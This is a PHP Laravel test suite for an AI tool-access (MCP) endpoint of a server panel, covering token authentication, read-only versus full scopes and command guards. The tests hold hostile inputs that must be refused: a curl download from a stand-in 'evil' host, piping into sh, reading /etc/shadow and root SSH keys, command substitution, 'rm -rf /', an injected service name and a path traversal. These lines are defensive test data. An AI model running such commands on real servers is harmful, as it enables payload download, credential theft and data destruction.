<?php

namespace Tests\Feature;

use App\Http\Middleware\EnsurePanelSessionIsValid;
use App\Models\CommandJob;
use App\Models\McpAccessToken;
use App\Models\Server;
use App\Models\User;
use App\Models\Website;
use App\Services\ServerPanel\SshClientService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Mockery;
use Tests\TestCase;

class McpServerTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('local');
        Queue::fake();
    }

    public function test_requests_without_a_valid_token_are_rejected(): void
    {
        $this->postJson('/api/mcp', $this->rpc('ping'))->assertStatus(401);

        $this->postJson('/api/mcp', $this->rpc('ping'), ['Authorization' => 'Bearer dp-mcp-wrong'])
            ->assertStatus(401)
            ->assertJsonPath('error.code', -32001);
    }

    public function test_token_stops_working_when_owner_is_no_longer_admin(): void
    {
        [$plain, $token] = $this->issueToken();
        $token->user->forceFill(['role' => 'general'])->save();

        $this->mcp($plain, 'ping')->assertStatus(401);
    }

    public function test_expired_and_disabled_tokens_are_rejected(): void
    {
        [$plain, $token] = $this->issueToken();

        $token->update(['expires_at' => now()->subMinute()]);
        $this->mcp($plain, 'ping')->assertStatus(401);

        $token->update(['expires_at' => null, 'is_active' => false]);
        $this->mcp($plain, 'ping')->assertStatus(401);
    }

    public function test_initialize_negotiates_protocol_and_advertises_tools(): void
    {
        [$plain] = $this->issueToken();

        $this->mcp($plain, 'initialize', ['protocolVersion' => '2025-03-26', 'capabilities' => new \stdClass, 'clientInfo' => ['name' => 'test', 'version' => '1']])
            ->assertOk()
            ->assertJsonPath('result.protocolVersion', '2025-03-26')
            ->assertJsonPath('result.serverInfo.name', 'dpanel')
            ->assertJsonPath('result.capabilities.tools.listChanged', false);

        $this->mcp($plain, 'initialize', ['protocolVersion' => '1999-01-01'])
            ->assertJsonPath('result.protocolVersion', '2025-06-18');
    }

    public function test_notifications_get_202_without_body(): void
    {
        [$plain] = $this->issueToken();

        $this->withHeaders(['Authorization' => 'Bearer '.$plain])
            ->postJson('/api/mcp', ['jsonrpc' => '2.0', 'method' => 'notifications/initialized'])
            ->assertStatus(202);
    }

    public function test_get_is_not_supported(): void
    {
        [$plain] = $this->issueToken();

        $this->withHeaders(['Authorization' => 'Bearer '.$plain])->get('/api/mcp')->assertStatus(405);
    }

    public function test_unknown_method_returns_json_rpc_error(): void
    {
        [$plain] = $this->issueToken();

        $this->mcp($plain, 'does/not/exist')->assertOk()->assertJsonPath('error.code', -32601);
    }

    public function test_tools_list_contains_diagnostic_tools(): void
    {
        [$plain] = $this->issueToken();

        $names = collect($this->mcp($plain, 'tools/list')->assertOk()->json('result.tools'))->pluck('name');

        foreach (['get_panel_overview', 'list_websites', 'get_website', 'read_service_logs', 'run_command', 'restart_service'] as $tool) {
            $this->assertContains($tool, $names);
        }
    }

    public function test_list_websites_returns_sites(): void
    {
        [$plain] = $this->issueToken();
        Website::query()->create(['id' => 'site-1', 'domain' => 'example.com', 'status' => 'active', 'type' => 'primary', 'php_version' => '8.3']);

        $response = $this->callTool($plain, 'list_websites', ['search' => 'example']);

        $response->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.total', 1)
            ->assertJsonPath('result.structuredContent.websites.0.domain', 'example.com');
    }

    public function test_unknown_website_is_a_tool_error_not_a_protocol_error(): void
    {
        [$plain] = $this->issueToken();

        $this->callTool($plain, 'get_website', ['domain' => 'missing.test'])
            ->assertOk()
            ->assertJsonPath('result.isError', true);
    }

    public function test_safe_command_runs_and_is_recorded(): void
    {
        [$plain] = $this->issueToken();
        $server = $this->server();
        $this->fakeSsh('Filesystem  Size  Used', 'df -h');

        $this->callTool($plain, 'run_command', ['command' => 'df -h'])
            ->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.status', 'success')
            ->assertJsonPath('result.structuredContent.output', 'Filesystem  Size  Used');

        $job = CommandJob::query()->firstOrFail();
        $this->assertSame($server->id, $job->server_id);
        $this->assertContains('mcp', $job->tags);
    }

    public function test_read_only_token_refuses_mutating_and_chained_commands(): void
    {
        [$plain] = $this->issueToken('read');
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        foreach (['systemctl restart nginx', 'ls; curl http://evil -o /tmp/x', "ls\ncurl http://evil -o /tmp/x", 'ls | sh', 'ls || id', 'cat /etc/shadow', 'ls -la /root/.ssh', 'whoami && id', 'ls $(id)'] as $command) {
            $this->callTool($plain, 'run_command', ['command' => $command])
                ->assertJsonPath('result.isError', true);
        }

        $this->callTool($plain, 'restart_service', ['service' => 'nginx'])
            ->assertJsonPath('result.isError', true);

        $this->assertSame(0, CommandJob::query()->count());
    }

    public function test_read_only_token_may_pipe_into_filters(): void
    {
        [$plain] = $this->issueToken('read');
        $this->server();
        $this->fakeSsh('error line');

        $this->callTool($plain, 'run_command', ['command' => 'journalctl -u nginx -n 50 | grep error'])
            ->assertJsonPath('result.isError', false);
    }

    public function test_full_token_runs_mutating_command_with_recorded_approval(): void
    {
        [$plain, $token] = $this->issueToken('full');
        $this->server();
        $this->fakeSsh('', 'systemctl restart nginx');

        $this->callTool($plain, 'run_command', ['command' => 'systemctl restart nginx'])
            ->assertJsonPath('result.isError', false);

        $job = CommandJob::query()->firstOrFail();
        $this->assertSame('approval_required', $job->risk_level);
        $this->assertSame($token->user_id, $job->approved_by);
        $this->assertDatabaseHas('activity_logs', ['action' => 'mcp.tool_called']);
    }

    public function test_blocked_commands_are_refused_even_with_full_token(): void
    {
        [$plain] = $this->issueToken('full');
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        $this->callTool($plain, 'run_command', ['command' => 'rm -rf /'])
            ->assertJsonPath('result.isError', true);
    }

    public function test_read_log_file_rejects_paths_outside_var_log(): void
    {
        [$plain] = $this->issueToken();
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        foreach (['/etc/passwd', '/var/log/../../etc/shadow', 'var/log/syslog'] as $path) {
            $this->callTool($plain, 'read_log_file', ['path' => $path])
                ->assertJsonPath('result.isError', true);
        }
    }

    public function test_service_tools_validate_unit_names(): void
    {
        [$plain] = $this->issueToken();
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        $this->callTool($plain, 'read_service_logs', ['service' => 'nginx; rm -rf /'])
            ->assertJsonPath('result.isError', true);
    }

    public function test_admin_can_issue_token_from_panel(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);

        $response = $this->withoutMiddleware(EnsurePanelSessionIsValid::class)->withSession(['panel_session_token' => str_repeat('a', 64)])->actingAs($admin)->postJson(route('mcp.tokens.store', ['token' => str_repeat('a', 64)]), [
            'name' => 'Laptop',
            'scope' => 'read',
        ])->assertOk();

        $plain = $response->json('plain_token');
        $this->assertStringStartsWith('dp-mcp-', $plain);
        $this->assertDatabaseHas('mcp_access_tokens', ['name' => 'Laptop', 'token_hash' => hash('sha256', $plain)]);
    }

    public function test_non_admin_cannot_issue_tokens(): void
    {
        $user = User::factory()->create(['role' => 'general']);

        $this->withoutMiddleware(EnsurePanelSessionIsValid::class)->withSession(['panel_session_token' => str_repeat('a', 64)])->actingAs($user)
            ->postJson(route('mcp.tokens.store', ['token' => str_repeat('a', 64)]), ['name' => 'x', 'scope' => 'full'])
            ->assertForbidden();

        $this->assertDatabaseCount('mcp_access_tokens', 0);
    }

    /**
     * @return array{0: string, 1: McpAccessToken}
     */
    private function issueToken(string $scope = 'read'): array
    {
        $user = User::factory()->create(['role' => 'admin']);
        $generated = McpAccessToken::generate();

        $token = McpAccessToken::query()->create([
            'user_id' => $user->id,
            'name' => 'test',
            'token_prefix' => $generated['prefix'],
            'token_hash' => $generated['hash'],
            'scope' => $scope,
        ]);

        return [$generated['plain'], $token->fresh('user')];
    }

    private function server(): Server
    {
        return Server::query()->create([
            'name' => 'Test Host',
            'host' => '127.0.0.1',
            'port' => 22,
            'username' => 'root',
            'auth_type' => 'password',
            'encrypted_password' => 'Password123!',
            'mode' => 'setup',
            'status' => 'online',
        ]);
    }

    private function fakeSsh(string $output, ?string $expectedCommand = null): void
    {
        $this->mock(SshClientService::class)
            ->shouldReceive('executeOnServer')
            ->once()
            ->with(Mockery::type(Server::class), $expectedCommand ?? Mockery::any())
            ->andReturn(['output' => $output, 'error_output' => '', 'exit_code' => 0]);
    }

    private function rpc(string $method, array $params = []): array
    {
        return ['jsonrpc' => '2.0', 'id' => 1, 'method' => $method, 'params' => $params === [] ? new \stdClass : $params];
    }

    private function mcp(string $plain, string $method, array $params = []): \Illuminate\Testing\TestResponse
    {
        return $this->withHeaders(['Authorization' => 'Bearer '.$plain])->postJson('/api/mcp', $this->rpc($method, $params));
    }

    private function callTool(string $plain, string $name, array $arguments): \Illuminate\Testing\TestResponse
    {
        return $this->mcp($plain, 'tools/call', ['name' => $name, 'arguments' => $arguments]);
    }
}
